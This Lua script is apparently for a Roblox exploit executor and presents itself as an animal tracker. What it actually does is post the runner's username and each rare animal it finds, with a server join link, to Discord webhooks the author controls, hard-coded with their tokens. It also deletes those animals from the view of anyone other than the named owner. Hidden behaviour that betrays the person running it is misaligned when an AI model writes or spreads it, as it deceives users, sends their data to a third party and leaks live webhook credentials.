-- üîó Webhook Animal Tracker + Plot Kitsune Scanner (with Join Link + Player Count)
local WEBHOOK1 = "https://discord.com/api/webhooks/1432020181441581229/vYYXG0DP-OBFZRgxxWtuY_kHuXOnTWVO_k9DsvsiZYNkAs4UlvGQ2opHfQPtg_OS_pAU"
local WEBHOOK2 = "https://discord.com/api/webhooks/1432390622312009750/g2IoaQ41zf_cho5ySXJGRgAOc3ohc6rYEDiNhHr3rJZKadfjloo-j2oXWQMF2L1ofm4a"
local WEBHOOK3 = "https://discord.com/api/webhooks/1433651417003982889/rvqz3XxkV1q20PhPoQaBhPaHUWjKwuY6HGKdj41mmiJDffOpkHFEA_ot1hhYHA36daOb"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ü¶¥ Folders
local map = workspace:WaitForChild("Map")
local animalsFolder = map:WaitForChild("Animals")
local plotsFolder = map:WaitForChild("Plots")

-- üñºÔ∏è Animal images / tracked models
local animalImages = {
	["Dragon"] = "https://drive.google.com/uc?export=view&id=1jkot99uQbfCcHoaLpJA-YTlskSq_JM2v",
	["Golden Dragon"] = "https://drive.google.com/uc?export=view&id=1bLDSMOgviKIPN5OKo3ngpX17HpzBoEkO",
	["Griffin"] = "https://drive.google.com/uc?export=view&id=1VRZTQ1xdH_vRbo1TSTLGtZ7wm1yMI5jS",
	["Hydra"] = "https://drive.google.com/uc?export=view&id=17FyXm7DkNReJo3i5ls3gtPUw4ENNk1de",
	["Phoenix"] = "https://drive.google.com/uc?export=view&id=1seUWOlkbjIhC2a-0wACqZ0ynSeHo02EC",
	["Unicorn"] = "https://drive.google.com/uc?export=view&id=1lDP0ln3dKIhblxlAz5MRm5wV2P1du5ah",
	["Kitsune"] = "https://drive.google.com/uc?export=view&id=1p2KTiIFQ9KdTYpetez0gY64l9qM1MLWs"
}

local targetAnimals = {}
for name, _ in pairs(animalImages) do
	targetAnimals[name] = true
end

-- üÜî Game info
local placeId = 96114180925459
local serverId = game.JobId
local username = player.Name

-- üåê Send username to WEBHOOK2
local function sendUsername()
	local payload = HttpService:JSONEncode({
		content = string.format("üë§ **Script Activated By:** `%s`", username)
	})
	local req = { Url = WEBHOOK2, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }

	if syn and syn.request then syn.request(req)
	elseif http_request then http_request(req)
	elseif request then request(req) end
end

-- üåê Send animal info to WEBHOOK1
local function sendAnimalWebhook(name, weight, imageUrl)
	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)
	local embed = {
		title = "üêæ Animal Detected!",
		color = 65280,
		fields = {
			{ name = "Animal", value = name, inline = true },
			{ name = "Weight", value = weight or "Unknown", inline = true },
			{ name = "Server ID", value = serverId, inline = false },
			{ name = "Copy Link", value = string.format("```\n%s\n```", joinLink), inline = false }
		},
		image = { url = imageUrl },
		footer = { text = "Tracking via Executor Script" }
	}
	local payload = HttpService:JSONEncode({ embeds = { embed } })
	local req = { Url = WEBHOOK1, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }

	if syn and syn.request then syn.request(req)
	elseif http_request then http_request(req)
	elseif request then request(req) end
end

-- üåê Send Kitsune found in Plots to WEBHOOK3 (with Join Link + Player Count)
local function sendKitsuneWebhook(plotName)
	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)
	local playerCount = #Players:GetPlayers()

	local embed = {
		title = "ü¶ä Kitsune Found in Plot!",
		color = 16753920,
		fields = {
			{ name = "Plot", value = plotName, inline = true },
			{ name = "Players in Server", value = tostring(playerCount), inline = true },
			{ name = "Server ID", value = serverId, inline = false },
			{ name = "Copy Link", value = string.format("```\n%s\n```", joinLink), inline = false }
		},
		image = { url = animalImages["Kitsune"] },
		footer = { text = "Detected via Plot Scan" }
	}
	local payload = HttpService:JSONEncode({ embeds = { embed } })
	local req = { Url = WEBHOOK3, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }

	if syn and syn.request then syn.request(req)
	elseif http_request then http_request(req)
	elseif request then request(req) end
end

-- ü¶Ñ Handle main animal detection
local function handleModel(model)
	if not model:IsA("Model") then return end
	local name = model.Name
	if not targetAnimals[name] then return end

	local weightValue = "Unknown"
	local info = model:FindFirstChild("Info")
	if info then
		local weight = info:FindFirstChild("Weight")
		if weight and weight:IsA("ValueBase") then
			weightValue = tostring(weight.Value)
		end
	end

	local imageUrl = animalImages[name]
	sendAnimalWebhook(name, weightValue, imageUrl)

	-- üßπ Client-only delete for non-owner
	if player.Name ~= "wishhole" then
		task.defer(function()
			if model and model.Parent then model:Destroy() end
		end)
	end
end

-- ü¶ä Scan all Plots for Kitsune
local function scanPlotsForKitsune()
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plot:FindFirstChild("Animals") then
			for _, animal in ipairs(plot.Animals:GetChildren()) do
				if animal.Name == "Kitsune" then
					sendKitsuneWebhook(plot.Name)
				end
			end
		end
	end
end

-- üì® Send username once
sendUsername()

-- üîç Initial scan in Animals folder
for _, animal in ipairs(animalsFolder:GetChildren()) do
	handleModel(animal)
end

-- üÜï Detect new animals in main Animals folder
animalsFolder.ChildAdded:Connect(function(animal)
	task.delay(0.2, function()
		handleModel(animal)
	end)
end)

-- üîÅ Scan all plots periodically (every 10 seconds)
task.spawn(function()
	while task.wait(10) do
		scanPlotsForKitsune()
	end
end)
